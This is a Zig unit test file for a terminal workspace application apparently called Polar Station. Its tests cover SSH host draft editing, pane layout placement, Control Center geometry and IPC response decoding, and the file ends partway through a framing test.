const std = @import("std");
const framing = @import("framing.zig");
const protocol = @import("protocol.zig");
const attach_argv = @import("attach_argv.zig");
const application_refresh = @import("application_refresh.zig");
const control_center_model = @import("control_center/model.zig");
const control_center_intent = @import("control_center/intent.zig");
const control_center_layout = @import("control_center/layout_policy.zig");
const control_center_host = @import("control_center/host_geometry.zig");
const control_center_width_preferences = @import("control_center/width_preferences.zig");
const settings = @import("settings.zig");
const session_interaction = @import("control_center/session_interaction.zig");
const workspace_reconciliation = @import("workspace_reconciliation.zig");
const workspace_rendering = @import("workspace_rendering.zig");
const shell_lifecycle = @import("shell_lifecycle.zig");
const shell_startup = @import("shell_startup.zig");
const native_workspace_layout = @import("native_workspace_layout.zig");
const native_surface_transition = @import("native_surface_transition.zig");
const pane_content = @import("pane_content.zig");
const content_lifecycle = @import("content_lifecycle.zig");
const pane_interaction = @import("pane_interaction.zig");
test {
    _ = @import("station_content.zig");
    _ = @import("pane_drag_test.zig");
    _ = @import("codex.zig");
}
const session_runtime = @import("session_runtime.zig");
const native_workspace_store = @import("native_workspace_store.zig");
const workspace_relay = @import("workspace_relay.zig");
const host_frame_batch = @import("host_frame_batch.zig");
const ipc_client = @import("ipc_client.zig");
const resources = @import("resources.zig");

test "cold Host draft survives projection arrival and retains captured target revision" {
    var draft: control_center_model.HostDraft = .{};
    defer draft.deinit(std.testing.allocator);
    try draft.edit(std.testing.allocator, "alice@offline");
    try std.testing.expect(draft.target_id == null);
    const editor: control_center_model.WorkspaceSshTargetEditor = .{
        .title = "Host",
        .target_id = "host-a",
        .target_revision = 7,
        .destination = "old@host",
        .destination_label = "SSH destination",
        .destination_placeholder = "user@host",
        .cancel_label = "Cancel",
        .save_label = "Save",
    };
    try draft.begin(std.testing.allocator, &editor);
    try std.testing.expectEqualStrings("alice@offline", draft.destination.?);
    var newer = editor;
    newer.target_revision = 8;
    newer.target_id = "host-b";
    try draft.begin(std.testing.allocator, &newer);
    try std.testing.expectEqualStrings("host-a", draft.target_id.?);
    try std.testing.expectEqual(@as(u64, 7), draft.target_revision);
}

test "Host acceptance cannot discard input edited during a pending save" {
    var draft: control_center_model.HostDraft = .{};
    defer draft.deinit(std.testing.allocator);
    try draft.edit(std.testing.allocator, "first@host");
    try draft.submit(std.testing.allocator);
    try draft.edit(std.testing.allocator, "second@host");
    draft.accept(std.testing.allocator);
    try std.testing.expectEqualStrings("second@host", draft.destination.?);
    try std.testing.expect(draft.dirty);
    try std.testing.expect(!draft.pending);
    try draft.submit(std.testing.allocator);
    draft.accept(std.testing.allocator);
    try std.testing.expect(draft.destination == null);
}

test "Host draft retains the complete SSH route record across rejection" {
    var draft: control_center_model.HostDraft = .{};
    defer draft.deinit(std.testing.allocator);
    const doh_providers = [_][]const u8{ "google", "cloudflare" };
    const editor: control_center_model.WorkspaceSshTargetEditor = .{
        .title = "Host",
        .target_id = "host-a",
        .target_revision = 7,
        .destination = "operator@remote.example",
        .route_profile = .{
            .lan_address = "10.0.0.49",
            .lan_port = 22,
            .wan_host = "remote.example",
            .wan_port = 22888,
            .doh_providers = &doh_providers,
        },
        .destination_label = "Destination",
        .destination_placeholder = "user@host",
        .cancel_label = "Cancel",
        .save_label = "Save",
    };
    try draft.begin(std.testing.allocator, &editor);
    try std.testing.expect(draft.route.enabled);
    try std.testing.expectEqualStrings("10.0.0.49", draft.route.lan_address.?);
    try std.testing.expectEqual(@as(u16, 22888), draft.routeProfile().?.wan_port);

    try draft.submit(std.testing.allocator);
    try draft.editRouteField(
        std.testing.allocator,
        .wan_host,
        "changed.example",
    );
    draft.accept(std.testing.allocator);
    try std.testing.expect(draft.dirty);
    try std.testing.expect(!draft.pending);
    try std.testing.expectEqualStrings(
        "changed.example",
        draft.routeProfile().?.wan_host,
    );

    try draft.submit(std.testing.allocator);
    draft.accept(std.testing.allocator);
    try std.testing.expect(draft.destination == null);
}

comptime {
    _ = pane_content;
    _ = content_lifecycle;
    _ = control_center_width_preferences;
    _ = settings;
    _ = native_workspace_store;
    _ = @import("native_workspace_state.zig");
    _ = workspace_relay;
    _ = host_frame_batch;
    _ = ipc_client;
}

test "Linux Pane clicks survive a Control Center redraw" {
    try std.testing.expect(!pane_interaction.isDoubleClick(
        null,
        0,
        "pane-a",
        100,
    ));
    try std.testing.expect(pane_interaction.isDoubleClick(
        "pane-a",
        100,
        "pane-a",
        250_000,
    ));
    try std.testing.expect(!pane_interaction.isDoubleClick(
        "pane-a",
        100,
        "pane-b",
        250_000,
    ));
    try std.testing.expect(!pane_interaction.isDoubleClick(
        "pane-a",
        100,
        "pane-a",
        400_101,
    ));
}

test "pure Linux presentation changes reuse Surface pointers without Rust content work" {
    const monitor = [_][]const u8{ "p1", "p2", "p3", "p4", "p5", "p6" };
    const focus = [_][]const u8{ "p6", "p1", "p2", "p3", "p4", "p5" };
    const transition = try native_surface_transition.plan(monitor[0..], focus[0..]);
    try std.testing.expectEqual(@as(usize, 6), transition.reused_count);
    try std.testing.expectEqual(@as(usize, 0), transition.created_count);
    try std.testing.expectEqual(@as(usize, 0), transition.retired_count);
    try std.testing.expectEqual(@as(usize, 0), transition.rust_content_request_count);
    try std.testing.expect(transition.replace_native_tree);
}

test "Linux Focus double-click promotes MAIN by swapping the existing visual slots" {
    const current = [_][]const u8{ "d", "a", "b", "c" };
    const promoted = try native_workspace_layout.promoteFocus(
        current[0..],
        "b",
    );
    try std.testing.expectEqualSlices(
        []const u8,
        &.{ "b", "a", "d", "c" },
        promoted.visualPaneIds(),
    );
    try std.testing.expectEqualStrings("b", promoted.mainPaneId().?);

    const unchanged = try native_workspace_layout.promoteFocus(
        promoted.visualPaneIds(),
        "b",
    );
    try std.testing.expectEqualSlices(
        []const u8,
        promoted.visualPaneIds(),
        unchanged.visualPaneIds(),
    );
    try std.testing.expectError(
        error.InvalidPaneIdentity,
        native_workspace_layout.promoteFocus(current[0..], "missing"),
    );
}

test "Linux native Monitor and Focus layout corpus owns one through nine Panes" {
    const pane_ids = [_][]const u8{
        "p1", "p2", "p3", "p4", "p5", "p6", "p7", "p8", "p9",
    };
    const monitor_populations = [_][]const usize{
        &.{1},         &.{ 1, 1 },    &.{ 1, 2 },    &.{ 1, 2, 1 }, &.{ 1, 2, 2 },
        &.{ 2, 2, 2 }, &.{ 2, 3, 2 }, &.{ 2, 3, 3 }, &.{ 3, 3, 3 },
    };
    const focus_populations = [_][]const usize{
        &.{1},         &.{ 1, 1 },    &.{ 1, 2 },    &.{ 1, 2, 1 }, &.{ 1, 2, 2 },
        &.{ 1, 2, 3 }, &.{ 1, 3, 3 }, &.{ 1, 3, 4 }, &.{ 1, 4, 4 },
    };

    for (1..10) |pane_count| {
        const monitor = try native_workspace_layout.layout(
            pane_ids[0..pane_count],
            .monitor,
            null,
        );
        try std.testing.expectEqualSlices(
            usize,
            monitor_populations[pane_count - 1],
            monitor.columnPopulations(),
        );
        try std.testing.expectEqualSlices(
            []const u8,
            pane_ids[0..pane_count],
            monitor.visualPaneIds(),
        );
        for (monitor.slotsSlice()) |slot| {
            try std.testing.expectEqual(
                native_workspace_layout.Role.monitor,
                slot.role,
            );
            try std.testing.expectEqual(
                native_workspace_layout.Ratio.init(
                    1,
                    monitor.columnPopulations().len,
                ),
                slot.width,
            );
        }

        const focus = try native_workspace_layout.layout(
            pane_ids[0..pane_count],
            .focus,
            pane_ids[pane_count - 1],
        );
        try std.testing.expectEqualSlices(
            usize,
            focus_populations[pane_count - 1],
            focus.columnPopulations(),
        );
        try std.testing.expectEqualStrings(
            pane_ids[pane_count - 1],
            focus.visualPaneIds()[0],
        );
        try std.testing.expectEqual(
            native_workspace_layout.Role.main,
            focus.slotsSlice()[0].role,
        );
        for (focus.slotsSlice()[1..]) |slot| {
            switch (slot.role) {
                .sidebar => {},
                else => return error.ExpectedSidebarRole,
            }
        }
    }
}

test "Linux native tree is right associated for rows and columns" {
    const pane_ids = [_][]const u8{
        "p1", "p2", "p3", "p4", "p5", "p6", "p7", "p8",
    };
    const native = try native_workspace_layout.layout(
        pane_ids[0..],
        .monitor,
        null,
    );
    const description = try native.tree.describeAlloc(std.testing.allocator);
    defer std.testing.allocator.free(description);
    try std.testing.expectEqualStrings(
        "H(V(p1,p2),H(V(p3,V(p4,p5)),V(p6,V(p7,p8))))",
        description,
    );
}

test "Linux native layout rejects invalid pane sets and Focus main identity" {
    const duplicate = [_][]const u8{ "p1", "p1" };
    const one = [_][]const u8{"p1"};
    const ten = [_][]const u8{
        "p1", "p2", "p3", "p4", "p5", "p6", "p7", "p8", "p9", "p10",
    };
    try std.testing.expectError(
        error.UnsupportedPaneCount,
        native_workspace_layout.layout(&.{}, .monitor, null),
    );
    try std.testing.expectError(
        error.InvalidPaneIdentity,
        native_workspace_layout.layout(duplicate[0..], .monitor, null),
    );
    try std.testing.expectError(
        error.UnsupportedPaneCount,
        native_workspace_layout.layout(ten[0..], .monitor, null),
    );
    try std.testing.expectError(
        error.MissingMainPane,
        native_workspace_layout.layout(one[0..], .focus, null),
    );
    try std.testing.expectError(
        error.MissingMainPane,
        native_workspace_layout.layout(one[0..], .focus, "p2"),
    );
}

test "managed Polar Station maximizes before mapping without launcher help" {
    try std.testing.expect(shell_startup.shouldMaximize(false, true));
    try std.testing.expect(shell_startup.shouldMaximize(true, true));
    try std.testing.expect(shell_startup.shouldMaximize(true, false));
    try std.testing.expect(!shell_startup.shouldMaximize(false, false));
    try std.testing.expect(!shell_startup.shouldFullscreen(true, true));
    try std.testing.expect(shell_startup.shouldFullscreen(true, false));
    try std.testing.expect(!shell_startup.shouldFullscreen(false, false));
    try std.testing.expect(shell_startup.shouldDeferController(false, false, 2560, 1440, true));
    try std.testing.expect(shell_startup.shouldDeferController(true, true, 2560, 1440, true));
    try std.testing.expect(shell_startup.shouldDeferController(true, false, 0, 1440, true));
    try std.testing.expect(shell_startup.shouldDeferController(true, false, 2560, 1, true));
    try std.testing.expect(!shell_startup.shouldDeferController(true, false, 2560, 1440, true));
    try std.testing.expect(!shell_startup.shouldDeferController(false, false, 0, 0, false));
}

test "Session projection refresh clamps but otherwise preserves scroll offset" {
    try std.testing.expectEqual(
        @as(f64, 420),
        session_interaction.restoredScrollOffset(420, 1200, 600),
    );
    try std.testing.expectEqual(
        @as(f64, 600),
        session_interaction.restoredScrollOffset(900, 1200, 600),
    );
    try std.testing.expectEqual(
        @as(f64, 0),
        session_interaction.restoredScrollOffset(420, 500, 600),
    );
}

test "Polar Station starts terminal-first and toggles one hosted Control Center" {
    var shell: shell_lifecycle.State = .{};

    try std.testing.expectEqual(
        shell_lifecycle.ControlCenter.absent,
        shell.control_center,
    );
    try std.testing.expectEqual(
        shell_lifecycle.Effect.create_and_show,
        shell.toggleControlCenter(),
    );
    try std.testing.expectEqual(
        shell_lifecycle.ControlCenter.visible,
        shell.control_center,
    );

    try std.testing.expectEqual(
        shell_lifecycle.Effect.hide_existing,
        shell.toggleControlCenter(),
    );
    try std.testing.expectEqual(
        shell_lifecycle.ControlCenter.hidden,
        shell.control_center,
    );
    try std.testing.expectEqual(
        shell_lifecycle.Effect.show_existing,
        shell.toggleControlCenter(),
    );
    try std.testing.expectEqual(
        shell_lifecycle.ControlCenter.visible,
        shell.control_center,
    );
}

test "Linux side pane grows the same toplevel without covering the terminal" {
    try std.testing.expect(control_center_host.shouldSetDefaultSize(false, false));
    try std.testing.expect(!control_center_host.shouldSetDefaultSize(true, false));
    try std.testing.expect(!control_center_host.shouldSetDefaultSize(false, true));

    const hidden = control_center_host.geometry(800, false, false, null);
    try std.testing.expectEqual(@as(c_int, 800), hidden.requested_outer_width);
    try std.testing.expectEqual(@as(c_int, 800), hidden.terminal_width);
    try std.testing.expectEqual(@as(c_int, 0), hidden.pane_width);

    const compact = control_center_host.geometry(800, true, false, null);
    try std.testing.expectEqual(@as(c_int, 1191), compact.requested_outer_width);
    try std.testing.expectEqual(@as(c_int, 800), compact.terminal_width);
    try std.testing.expectEqual(@as(c_int, 390), compact.pane_width);

    const sessions = control_center_host.geometry(800, true, true, null);
    try std.testing.expectEqual(@as(c_int, 1472), sessions.requested_outer_width);
    try std.testing.expectEqual(@as(c_int, 800), sessions.terminal_width);
    try std.testing.expectEqual(@as(c_int, 671), sessions.pane_width);

    const constrained = control_center_host.geometry(800, true, true, 1200);
    try std.testing.expectEqual(@as(c_int, 1200), constrained.requested_outer_width);
    try std.testing.expectEqual(@as(c_int, 528), constrained.terminal_width);
    try std.testing.expectEqual(@as(c_int, 671), constrained.pane_width);

    const maximized = control_center_host.geometryForPaneWidth(
        1920,
        true,
        390,
        1920,
    );
    try std.testing.expectEqual(@as(c_int, 1920), maximized.requested_outer_width);
    try std.testing.expectEqual(@as(c_int, 1529), maximized.terminal_width);
    try std.testing.expectEqual(@as(c_int, 390), maximized.pane_width);
}

test "rapid hide then show preserves the original terminal baseline" {
    try std.testing.expectEqual(
        @as(c_int, 800),
        control_center_host.baselineForShow(800, 1191, 1191),
    );
    try std.testing.expectEqual(
        @as(c_int, 800),
        control_center_host.baselineForShow(800, 1191, 800),
    );
    try std.testing.expectEqual(
        @as(c_int, 960),
        control_center_host.baselineForShow(800, 1191, 960),
    );
}

test "Control Center fixture preserves the live-audited shell contract" {
    const fixture = @embedFile("fixtures/controller-sessions-closed.json");
    var parsed = try std.json.parseFromSlice(
        control_center_model.Projection,
        std.testing.allocator,
        fixture,
        .{ .ignore_unknown_fields = true },
    );
    defer parsed.deinit();

    const projection = &parsed.value;
    try std.testing.expectEqual(@as(u16, 1), projection.schema_version);
    try std.testing.expect(!@hasField(control_center_model.Projection, "component_order"));
    try std.testing.expect(!@hasField(control_center_model.BottomBar, "action_order"));
    try std.testing.expect(projection.header.lifecycle_action == null);
    try std.testing.expectEqualStrings(
        "workspace.rename",
        projection.header.rename_action.id,
    );
    try std.testing.expectEqualStrings(
        "session.create.local.shell",
        projection.sessions.local_new_shell.id,
    );
    try std.testing.expectEqualStrings(
        "workspace.restore",
        projection.header.refresh.id,
    );
    try std.testing.expect(projection.header.refresh.confirmation != null);
    try std.testing.expectEqual(@as(usize, 2), projection.bottom_bar.more_actions.len);
    try std.testing.expectEqualStrings(
        "managed.terminal.font.size",
        projection.bottom_bar.more_actions[0].id,
    );
    try std.testing.expectEqualStrings(
        "workspace.create",
        projection.bottom_bar.more_actions[1].id,
    );
    try std.testing.expect(!projection.sessions.visible);
    try std.testing.expect(!@hasField(control_center_model.Projection, "workspace_map"));
}

test "Control Center uses the Mac-audited mapped-window widths" {
    try std.testing.expectEqual(@as(c_int, 390), control_center_layout.layout_map_outer_width);
    try std.testing.expectEqual(@as(c_int, 280), control_center_layout.sessions_outer_width);
    try std.testing.expectEqual(@as(c_int, 260), control_center_layout.sessions_content_width);
    try std.testing.expectEqual(@as(c_int, 10), control_center_layout.controller_section_margin);
    try std.testing.expectEqual(@as(c_int, 4), control_center_layout.pane_tile_vertical_padding);
    try std.testing.expectEqual(
        @as(c_int, 671),
        control_center_layout.windowWidth(true),
    );
    try std.testing.expectEqual(
        @as(c_int, 390),
        control_center_layout.windowWidth(false),
    );
}

test "Control Center width policy clamps bidirectional drag and derives adaptive defaults" {
    try std.testing.expectEqual(@as(c_int, 200), control_center_layout.clampMapWidth(1));
    try std.testing.expectEqual(@as(c_int, 390), control_center_layout.clampMapWidth(999));
    try std.testing.expectEqual(@as(c_int, 300), control_center_layout.adaptiveMapWidth(1200));
    try std.testing.expectEqual(@as(c_int, 390), control_center_layout.adaptiveMapWidth(2400));
    try std.testing.expectEqual(
        @as(c_int, 390),
        control_center_layout.resizedMapWidth(350, 40),
    );
    try std.testing.expectEqual(
        @as(c_int, 295),
        control_center_layout.resizedMapWidth(350, -55),
    );
    try std.testing.expectEqual(
        @as(c_int, 260),
        control_center_layout.resizedMapWidth(200, 60),
    );

    const expanded = control_center_layout.bodyLayoutWithMapWidth(true, true, 340);
    try std.testing.expectEqual(@as(c_int, 340), expanded.layout_map_outer_width);
    try std.testing.expectEqual(@as(c_int, 621), expanded.controller_width);
    const compact = control_center_layout.bodyLayoutWithMapWidth(false, true, 340);
    try std.testing.expectEqual(@as(c_int, 340), compact.controller_width);
    const visual = [_][]const u8{ "p1", "p2", "p3", "p4", "p5", "p6" };
    const compact_placement = try control_center_layout.gridPlacementForMapWidth(
        visual[0..],
        .monitor,
        "p6",
        200,
    );
    try std.testing.expectEqual(@as(c_int, 2), compact_placement.column);
    try std.testing.expectEqual(@as(c_int, 1), compact_placement.row);
    try std.testing.expectEqual(
        @as(c_int, 96),
        control_center_layout.scaledTabBodyHeight(.focus, 1, 200),
    );
    try std.testing.expectEqual(
        @as(c_int, 4),
        control_center_layout.scaledPaneGridGap(200),
    );
}

test "Session rows retain the mature Mac desktop density" {
    try std.testing.expectEqual(
        @as(c_int, 44),
        control_center_layout.session_row_min_height,
    );
    try std.testing.expectEqual(
        @as(c_int, 10),
        control_center_layout.session_row_horizontal_padding,
    );
}

test "closing Sessions removes its column and divider before compact reflow" {
    const expanded = control_center_layout.bodyLayout(true, true);
    try std.testing.expect(expanded.sidebar_visible);
    try std.testing.expect(expanded.divider_visible);
    try std.testing.expect(expanded.layout_map_visible);
    try std.testing.expectEqual(@as(c_int, 280), expanded.sessions_outer_width);
    try std.testing.expectEqual(@as(c_int, 390), expanded.layout_map_outer_width);
    try std.testing.expectEqual(@as(c_int, 671), expanded.controller_width);

    const sessions_only = control_center_layout.bodyLayout(true, false);
    try std.testing.expect(sessions_only.sidebar_visible);
    try std.testing.expect(!sessions_only.divider_visible);
    try std.testing.expect(!sessions_only.layout_map_visible);
    try std.testing.expectEqual(@as(c_int, 280), sessions_only.sessions_outer_width);
    try std.testing.expectEqual(@as(c_int, 0), sessions_only.layout_map_outer_width);
    try std.testing.expectEqual(@as(c_int, 280), sessions_only.controller_width);

    const compact = control_center_layout.bodyLayout(false, true);
    try std.testing.expect(!compact.sidebar_visible);
    try std.testing.expect(!compact.divider_visible);
    try std.testing.expect(compact.layout_map_visible);
    try std.testing.expectEqual(@as(c_int, 0), compact.sessions_outer_width);
    try std.testing.expectEqual(@as(c_int, 390), compact.layout_map_outer_width);
    try std.testing.expectEqual(@as(c_int, 390), compact.controller_width);

    const normalized_empty = control_center_layout.bodyLayout(false, false);
    try std.testing.expect(!normalized_empty.sidebar_visible);
    try std.testing.expect(!normalized_empty.layout_map_visible);
    try std.testing.expectEqual(@as(c_int, 0), normalized_empty.controller_width);
}

test "Control Center derives native Focus placement without Rust geometry" {
    const pane: control_center_model.Pane = .{
        .id = "pane-1",
        .execution_target_id = "local",
        .tmux_session_id = "$1",
        .target_label = "This computer",
        .session_name = "polarstation",
        .transport_status = .online,
        .selected = true,
    };
    const panes = [_]control_center_model.Pane{
        pane,
        .{
            .id = "pane-2",
            .execution_target_id = "local",
            .tmux_session_id = "$2",
            .target_label = "This computer",
            .session_name = "sidebar",
            .transport_status = .online,
            .selected = false,
        },
    };
    const main_placement = try control_center_layout.gridPlacement(
        &panes,
        .focus,
        "pane-1",
        panes[0],
    );
    const sidebar_placement = try control_center_layout.gridPlacement(
        &panes,
        .focus,
        "pane-1",
        panes[1],
    );
    try std.testing.expectEqual(@as(c_int, 4), main_placement.column_span);
    try std.testing.expectEqual(@as(c_int, 4), sidebar_placement.column);
    try std.testing.expectEqual(@as(c_int, 1), sidebar_placement.column_span);
}

test "Control Center placement follows the native visual Pane order" {
    const canonical = [_][]const u8{ "a", "b", "c", "d" };
    const native_visual = [_][]const u8{ "d", "a", "b", "c" };

    const main = try control_center_layout.gridPlacementFromVisualPaneIds(
        &native_visual,
        .focus,
        "d",
    );
    const promoted = try control_center_layout.gridPlacementFromVisualPaneIds(
        &native_visual,
        .focus,
        "a",
    );
    const stale = try control_center_layout.gridPlacement(
        &[_]control_center_model.Pane{
            .{
                .id = canonical[0],
                .execution_target_id = "local",
                .tmux_session_id = "$1",
                .target_label = "This computer",
                .session_name = "a",
                .transport_status = .online,
                .selected = false,
            },
            .{
                .id = canonical[1],
                .execution_target_id = "local",
                .tmux_session_id = "$2",
                .target_label = "This computer",
                .session_name = "b",
                .transport_status = .online,
                .selected = false,
            },
            .{
                .id = canonical[2],
                .execution_target_id = "local",
                .tmux_session_id = "$3",
                .target_label = "This computer",
                .session_name = "c",
                .transport_status = .online,
                .selected = false,
            },
            .{
                .id = canonical[3],
                .execution_target_id = "local",
                .tmux_session_id = "$4",
                .target_label = "This computer",
                .session_name = "d",
                .transport_status = .online,
                .selected = false,
            },
        },
        .focus,
        "a",
        .{
            .id = "a",
            .execution_target_id = "local",
            .tmux_session_id = "$1",
            .target_label = "This computer",
            .session_name = "a",
            .transport_status = .online,
            .selected = false,
        },
    );

    try std.testing.expectEqual(@as(c_int, 0), main.column);
    try std.testing.expectEqual(@as(c_int, 3), promoted.column);
    try std.testing.expectEqual(@as(c_int, 0), stale.column);
    try std.testing.expectEqual(@as(c_int, 0), promoted.row);
    try std.testing.expectEqual(@as(c_int, 0), stale.row);
}

test "Focus six-pane placement keeps one main and two row-grouped side columns" {
    const panes = [_]control_center_model.Pane{
        .{
            .id = "main",
            .execution_target_id = "local",
            .tmux_session_id = "$1",
            .target_label = "This computer",
            .session_name = "main",
            .transport_status = .online,
            .selected = true,
        },
        .{
            .id = "side-1",
            .execution_target_id = "local",
            .tmux_session_id = "$2",
            .target_label = "This computer",
            .session_name = "side-1",
            .transport_status = .online,
            .selected = false,
        },
        .{
            .id = "side-2",
            .execution_target_id = "local",
            .tmux_session_id = "$3",
            .target_label = "This computer",
            .session_name = "side-2",
            .transport_status = .online,
            .selected = false,
        },
        .{
            .id = "side-3",
            .execution_target_id = "local",
            .tmux_session_id = "$4",
            .target_label = "This computer",
            .session_name = "side-3",
            .transport_status = .online,
            .selected = false,
        },
        .{
            .id = "side-4",
            .execution_target_id = "local",
            .tmux_session_id = "$5",
            .target_label = "This computer",
            .session_name = "side-4",
            .transport_status = .online,
            .selected = false,
        },
        .{
            .id = "side-5",
            .execution_target_id = "local",
            .tmux_session_id = "$6",
            .target_label = "This computer",
            .session_name = "side-5",
            .transport_status = .online,
            .selected = false,
        },
    };
    const expected = [_]control_center_layout.GridPlacement{
        .{ .column = 0, .row = 0, .column_span = 3, .row_span = 6 },
        .{ .column = 3, .row = 0, .column_span = 1, .row_span = 3 },
        .{ .column = 3, .row = 3, .column_span = 1, .row_span = 3 },
        .{ .column = 4, .row = 0, .column_span = 1, .row_span = 2 },
        .{ .column = 4, .row = 2, .column_span = 1, .row_span = 2 },
        .{ .column = 4, .row = 4, .column_span = 1, .row_span = 2 },
    };
    for (panes, expected) |pane, placement| {
        try std.testing.expectEqual(
            placement,
            try control_center_layout.gridPlacement(
                &panes,
                .focus,
                "main",
                pane,
            ),
        );
    }
}

test "Pane remove action appears only for selected focused or hovered tiles" {
    try std.testing.expect(!control_center_layout.paneRemoveVisible(false, false, false));
    try std.testing.expect(control_center_layout.paneRemoveVisible(true, false, false));
    try std.testing.expect(control_center_layout.paneRemoveVisible(false, true, false));
    try std.testing.expect(control_center_layout.paneRemoveVisible(false, false, true));
}

test "Control Center Tab cards retain the mature bounded body heights" {
    const focus = control_center_layout.tabCardLayout(.focus, 1, 1);
    try std.testing.expectEqual(@as(c_int, 32), focus.header_height);
    try std.testing.expectEqual(@as(c_int, 200), focus.body_height);
    try std.testing.expectEqual(@as(usize, 1), focus.pane_column_count);
    try std.testing.expect(focus.card_hexpand);
    try std.testing.expect(focus.grid_hexpand);
    try std.testing.expect(focus.pane_tile_hexpand);
    try std.testing.expect(focus.pane_overlay_hexpand);
    try std.testing.expect(!focus.card_vexpand);
    try std.testing.expect(!focus.grid_vexpand);
    try std.testing.expect(focus.pane_tile_vexpand);
    try std.testing.expect(focus.pane_overlay_vexpand);
    try std.testing.expect(!focus.remove_overlay_measured);

    const monitor = control_center_layout.tabCardLayout(.monitor, 1, 3);
    try std.testing.expectEqual(@as(c_int, 170), monitor.body_height);
    try std.testing.expectEqual(@as(usize, 3), monitor.pane_column_count);
    try std.testing.expect(monitor.card_hexpand);
    try std.testing.expect(monitor.grid_hexpand);
    try std.testing.expect(monitor.pane_tile_hexpand);
    try std.testing.expect(monitor.pane_overlay_hexpand);
    try std.testing.expect(!monitor.card_vexpand);
    try std.testing.expect(!monitor.grid_vexpand);
    try std.testing.expect(monitor.pane_tile_vexpand);
    try std.testing.expect(monitor.pane_overlay_vexpand);
    try std.testing.expect(!monitor.remove_overlay_measured);

    try std.testing.expectEqual(
        @as(c_int, 240),
        control_center_layout.tabCardLayout(.focus, 5, 2).body_height,
    );
    try std.testing.expectEqual(
        @as(c_int, 224),
        control_center_layout.tabCardLayout(.monitor, 4, 3).body_height,
    );

    const one_column = control_center_layout.tabCardLayout(.monitor, 2, 1);
    const two_columns = control_center_layout.tabCardLayout(.monitor, 2, 2);
    const three_columns = control_center_layout.tabCardLayout(.monitor, 2, 3);
    try std.testing.expectEqual(one_column.card_hexpand, two_columns.card_hexpand);
    try std.testing.expectEqual(two_columns.card_hexpand, three_columns.card_hexpand);
    try std.testing.expectEqual(one_column.grid_hexpand, three_columns.grid_hexpand);
    try std.testing.expectEqual(
        one_column.pane_overlay_hexpand,
        three_columns.pane_overlay_hexpand,
    );
}

test "Control Center model owns decoded projection after IPC payload release" {
    const fixture = @embedFile("fixtures/controller-sessions-closed.json");
    const frame = try std.fmt.allocPrint(
        std.testing.allocator,
        "{{\"type\":\"application_response\",\"response\":{{\"protocol_version\":1,\"api\":\"control_center_v1\",\"request_id\":\"linux-1\",\"control_revision\":0,\"result\":{{\"type\":\"projection\",\"projection\":{s}}}}}}}",
        .{fixture},
    );

    var model = control_center_model.Model.init(std.testing.allocator);
    defer model.deinit();
    model.setLocalError("projection decoding: InvalidEnumTag");
    try model.setConnected("host-1");
    try std.testing.expectEqualStrings("projection decoding: InvalidEnumTag", model.last_error.?);
    try std.testing.expectError(error.UnexpectedEndOfInput, model.applyApplicationResponse("{"));
    try std.testing.expect(model.last_error != null);
    try model.applyApplicationResponse("{\"type\":\"application_response\",\"response\":{\"protocol_version\":1,\"api\":\"control_center_v1\",\"request_id\":\"ack\",\"control_revision\":0,\"result\":{\"type\":\"intent_accepted\"}}}");
    try std.testing.expect(model.last_error != null);
    try model.applyApplicationResponse(frame);
    try std.testing.expect(model.last_error == null);
    std.testing.allocator.free(frame);
    const projection = model.projection().?;
    try std.testing.expectEqualStrings(
        "Rename Workspace",
        projection.header.rename_action.label,
    );
    try std.testing.expect(projection.header.lifecycle_action == null);
}

test "Session feed owns attention without receiving native membership" {
    for ([_][]const u8{ "idle", "unknown", "working", "review_ready", "needs_attention", "approval_required", "decision_required", "permission_required", "failed" }) |state| {
        const snapshot = try std.fmt.allocPrint(std.testing.allocator, "{{\"type\":\"session_feed_snapshot\",\"snapshot\":{{\"epoch\":\"host\",\"revision\":1,\"sessions\":[{{\"key\":{{\"execution_target\":\"local\",\"tmux_session_id\":\"$1\"}},\"display_name\":\"main\",\"lifecycle\":\"ready\",\"revision\":1,\"attention\":{{\"state\":\"{s}\"}}}}]}}}}", .{state});
        defer std.testing.allocator.free(snapshot);
        var cache = session_runtime.Cache.init(std.testing.allocator);
        defer cache.deinit();
        try cache.applySnapshot(snapshot);
        try std.testing.expectEqualStrings(state, @tagName(cache.attention("local", "$1").?.state));
    }
}

test "Control Center model accepts Session runtime events without replacing native Workspace state" {
    const fixture = @embedFile("fixtures/controller-sessions-closed.json");
    const frame = try std.fmt.allocPrint(
        std.testing.allocator,
        "{{\"type\":\"application_response\",\"response\":{{\"protocol_version\":1,\"api\":\"control_center_v1\",\"request_id\":\"linux-runtime\",\"control_revision\":0,\"result\":{{\"type\":\"projection\",\"projection\":{s}}}}}}}",
        .{fixture},
    );
    defer std.testing.allocator.free(frame);

    var model = control_center_model.Model.init(std.testing.allocator);
    defer model.deinit();
    try model.applyApplicationResponse(frame);
    var sessions = session_runtime.Cache.init(std.testing.allocator);
    defer sessions.deinit();
    try sessions.applySnapshot(
        "{\"type\":\"session_feed_snapshot\",\"snapshot\":{\"epoch\":\"host-1\",\"revision\":1,\"sessions\":[]}}",
    );

    model.applySessionRuntime(&sessions);

    try std.testing.expectEqualStrings(
        "Rename Workspace",
        model.projection().?.header.rename_action.label,
    );
}

test "Control Center model retains the last usable projection after typed rejection" {
    const fixture = @embedFile("fixtures/controller-sessions-closed.json");
    const projection_frame = try std.fmt.allocPrint(
        std.testing.allocator,
        "{{\"type\":\"application_response\",\"response\":{{\"protocol_version\":1,\"api\":\"control_center_v1\",\"request_id\":\"linux-projection\",\"control_revision\":7,\"result\":{{\"type\":\"projection\",\"projection\":{s}}}}}}}",
        .{fixture},
    );
    defer std.testing.allocator.free(projection_frame);
    const rejected_frame =
        "{\"type\":\"application_response\",\"response\":{\"protocol_version\":1,\"api\":\"control_center_v1\",\"request_id\":\"linux-rejected\",\"control_revision\":7,\"result\":{\"type\":\"error\",\"error\":{\"code\":\"stale_revision\",\"message\":\"Reload and try again.\"},\"projection\":null}}}";

    var model = control_center_model.Model.init(std.testing.allocator);
    defer model.deinit();
    try model.applyApplicationResponse(projection_frame);
    try model.applyApplicationResponse(rejected_frame);

    try std.testing.expectEqualStrings(
        "Rename Workspace",
        model.projection().?.header.rename_action.label,
    );
    try std.testing.expectEqualStrings(
        "Reload and try again.",
        model.last_error.?,
    );

    model.dismissError();

    try std.testing.expect(model.last_error == null);
    try std.testing.expectEqualStrings(
        "Rename Workspace",
        model.projection().?.header.rename_action.label,
    );
}

test "length prefix is big endian and rejects oversized payloads" {
    const prefix = try framing.encodeLength(0x0001_0203);
    try std.testing.expectEqualSlices(u8, &.{ 0x00, 0x01, 0x02, 0x03 }, &prefix);
    try std.testing.expectEqual(@as(usize, 0x0001_0203), try framing.decodeLength(prefix));
